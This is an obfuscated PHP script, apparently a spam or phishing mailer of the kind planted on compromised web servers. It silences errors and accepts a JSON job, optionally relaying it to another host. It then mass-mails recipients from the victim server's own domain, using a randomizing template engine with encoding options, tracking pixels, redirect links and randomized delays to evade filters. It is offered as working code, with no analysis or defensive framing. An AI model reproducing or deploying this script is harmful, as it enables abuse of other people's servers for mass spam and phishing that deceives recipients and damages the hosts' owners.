<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spd2140f) { if ($spd2140f == 'keys') { return array_keys($this->_keys); } } public function Import($spd2140f, $spf29f19) { if (is_array($spf29f19)) { $this->values[$spd2140f] = array(); foreach ($spf29f19 as $sp9ea665) { if (!empty($sp9ea665['key'])) { $this->values[$spd2140f][$sp9ea665['key']] = $sp9ea665['value']; } else { $this->values[$spd2140f][] = $sp9ea665['value']; } } } else { $this->Assign($spd2140f, $spf29f19); } } public function Assign($spd2140f, $sp3076d7) { $this->values[$spd2140f] = $sp3076d7; } public function Parse($sp1a143d) { $sp493cef = ''; $spb04f65 = 0; while (true) { $sp865a7f = strpos($sp1a143d, '{', $spb04f65); if ($sp865a7f === false) { $sp493cef .= substr($sp1a143d, $spb04f65); break; } $sp493cef .= substr($sp1a143d, $spb04f65, $sp865a7f - $spb04f65); $spb04f65 = $sp865a7f + 1; $sp99e56b = ''; $sp1087a9 = '{'; $spac2ed1 = array(); $sp78dbb9 = false; $sp064728 = false; $sp158b71 = 'var'; while ($spb04f65 < strlen($sp1a143d)) { $sp977a98 = substr($sp1a143d, $spb04f65, 1); $sp1087a9 .= $sp977a98; if ($sp977a98 == ',' || $sp977a98 == '>' || $sp977a98 == '|') { if ($sp158b71 == 'alias') { $sp78dbb9 = $sp99e56b; } elseif ($sp158b71 == 'mod') { $sp064728 = $sp99e56b; } else { $spac2ed1[] = $sp99e56b; } $sp99e56b = ''; if ($sp977a98 == '>') { $sp158b71 = 'alias'; } if ($sp977a98 == '|') { $sp158b71 = 'mod'; } $spb04f65++; continue; } if ($sp977a98 == '}') { if ($sp158b71 == 'alias') { $sp78dbb9 = $sp99e56b; } elseif ($sp158b71 == 'mod') { $sp064728 = $sp99e56b; } else { $spac2ed1[] = $sp99e56b; } $spb04f65++; break; } $sp99e56b .= $sp977a98; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp977a98) == 0) { $spb04f65++; $spac2ed1 = array(); break; } $spb04f65++; } if (sizeof($spac2ed1) == 0) { $sp493cef .= $sp1087a9; continue; } $spd73771 = false; $sp776f93 = false; if (preg_match('/^\\^/', $spac2ed1[0]) > 0) { $spac2ed1[0] = substr($spac2ed1[0], 1); $spd73771 = true; } if (preg_match('/^\\!/', $spac2ed1[0]) > 0) { $spac2ed1[0] = substr($spac2ed1[0], 1); $sp776f93 = true; } $sp1238bc = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spac2ed1[0], $spf1529d) > 0) { $sp1238bc = $spf1529d[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spac2ed1[0], $spf1529d) > 0) { $sp1238bc = explode('-', $spf1529d[1]); } if ($sp1238bc !== false) { $spac2ed1[0] = substr($spac2ed1[0], 0, strpos($spac2ed1[0], '[')); } $this->_keys[$spac2ed1[0]] = true; if (empty($this->values[$spac2ed1[0]]) && empty($this->fixed[$spac2ed1[0]])) { continue; } if ($spd73771) { unset($this->fixed[$spac2ed1[0]]); } if (isset($this->fixed[$spac2ed1[0]])) { $sp92a589 = $this->fixed[$spac2ed1[0]]; } else { $sp92a589 = ''; $sp940d22 = 1; if (sizeof($spac2ed1) == 2) { $sp940d22 = $spac2ed1[1]; } if (sizeof($spac2ed1) == 3) { $sp940d22 = rand($spac2ed1[1], $spac2ed1[2]); } for ($sp4e3db5 = 0; $sp4e3db5 < $sp940d22; $sp4e3db5++) { if (is_array($this->values[$spac2ed1[0]])) { if (!is_array($this->used[$spac2ed1[0]])) { $this->used[$spac2ed1[0]] = array(); } if (count($this->used[$spac2ed1[0]]) == count($this->values[$spac2ed1[0]])) { $this->used[$spac2ed1[0]] = array(); } if ($sp1238bc !== false && is_scalar($sp1238bc)) { $sp92a589 .= $this->values[$spac2ed1[0]][$sp1238bc]; $this->used[$sp1238bc] = true; } else { $spc3e46f = array(); if (is_array($sp1238bc)) { $spf69c03 = $sp1238bc[0]; $sp6d4488 = $sp1238bc[1]; } else { $spf69c03 = 0; $sp6d4488 = count($this->values[$spac2ed1[0]]) - 1; } for ($spb66584 = $spf69c03; $spb66584 <= $sp6d4488; $spb66584++) { if ($sp776f93 && !empty($this->used[$spac2ed1[0]][$spb66584])) { continue; } $spc3e46f[] = $spb66584; } $sp9a8986 = $spc3e46f[rand(0, count($spc3e46f) - 1)]; $this->used[$spac2ed1[0]][$sp9a8986] = true; $sp92a589 .= $this->values[$spac2ed1[0]][$sp9a8986]; } } else { $sp92a589 .= $this->values[$spac2ed1[0]]; } } } $sp92a589 = $this->Parse($sp92a589); if ($sp064728 !== false) { for ($sp8ccc3b = 0; $sp8ccc3b < strlen($sp064728); $sp8ccc3b++) { switch (substr($sp064728, $sp8ccc3b, 1)) { case 'b': $sp92a589 = base64_encode($sp92a589); break; case 'q': $sp92a589 = quoted_printable_encode($sp92a589); break; default: break; } } } if ($spd73771) { $this->fixed[$spac2ed1[0]] = $sp92a589; } if ($sp78dbb9 !== false && $sp78dbb9 != '') { $this->fixed[$sp78dbb9] = $sp92a589; } $sp493cef .= $sp92a589; } return $sp493cef; } } $spe77385 = file_get_contents('php://input'); $sp834bea = json_decode($spe77385, true); if (empty($sp834bea['via_proxy'])) { $sp834bea['via_proxy'] = true; $sp96ac48 = curl_init($sp834bea['prefix'] . $sp834bea['files']['s']); $spcb4449 = json_encode($sp834bea); curl_setopt($sp96ac48, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp96ac48, CURLOPT_TIMEOUT, 600); curl_setopt($sp96ac48, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp96ac48, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp96ac48, CURLOPT_REFERER, $sp331610); curl_setopt($sp96ac48, CURLOPT_POST, true); curl_setopt($sp96ac48, CURLOPT_POSTFIELDS, $spcb4449); curl_setopt($sp96ac48, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spcb4449))); $sp5ba5b4 = curl_exec($sp96ac48); echo $sp5ba5b4; die; } $sp2cbb0c = $_SERVER['SERVER_ADDR']; $spb559f1 = $_SERVER['HTTP_HOST']; $spb559f1 = preg_replace('/^www\\./', '', $spb559f1); $sp5bff58 = new Macros(); $sp5bff58->Assign('server_addr', $sp2cbb0c); $sp5bff58->Assign('server_host', $spb559f1); foreach ($sp834bea['macros'] as $spd2140f => $spf29f19) { $sp5bff58->Import($spd2140f, $spf29f19); } $spd13a55 = preg_replace('/^www\\./i', '', $spb559f1); $sp1aee7a = $sp5bff58->Parse('{from_user}@' . $spd13a55); $sp5bff58->Assign('from_email', $sp1aee7a); $sp5bff58->Assign('prefix', $sp834bea['prefix']); $sp5bff58->Assign('html', $sp834bea['letter']['html']); $spb04f65 = 0; $sp827ae5 = 0; $sp71d5d3 = 0; $sp755efa = array(); foreach ($sp834bea['rcpt'] as $spd1bd99) { $sp5bff58->Assign('email', $spd1bd99['email']); $sp5bff58->Assign('entry', $spd1bd99); $sp5bff58->Assign('date', date('r')); $sp5bff58->Assign('redirect', $sp834bea['prefix'] . $sp834bea['files']['r']); $sp5bff58->Assign('redirect_with_uri', $sp834bea['prefix'] . $sp834bea['files']['r'] . '?uri='); $sp5bff58->Assign('unsubscribe', $sp834bea['prefix'] . $sp834bea['files']['u'] . '?id=' . $spd1bd99['id']); $sp5bff58->Assign('delivery', '<img src="' . $sp834bea['prefix'] . $sp834bea['files']['d'] . '?id=' . $spd1bd99['id'] . '" />'); $spfeb7cf = $sp5bff58->Parse($sp834bea['envelope']['header']); $spca907a = $sp5bff58->Parse($sp834bea['envelope']['body']); if (!empty($spd1bd99['name'])) { $sp401241 = $spd1bd99['name'] . ' <' . $spd1bd99['email'] . '>'; } else { $sp401241 = $spd1bd99['email']; } $spc9d1d3 = $sp5bff58->Parse($sp834bea['letter']['subject']); if ($spb04f65 > 0) { sleep(rand(3, 8)); } $sp5a45b1 = mail($sp401241, $spc9d1d3, $spca907a, $spfeb7cf); $sp755efa[$spd1bd99['id']] = $sp5a45b1; if ($sp5a45b1) { $sp827ae5++; } else { $sp71d5d3++; } $spb04f65++; } echo serialize(array('total' => count($sp834bea['rcpt']), 'sent' => $spb04f65, 'success' => $sp827ae5, 'error' => $sp71d5d3, 'rcpt' => $sp755efa));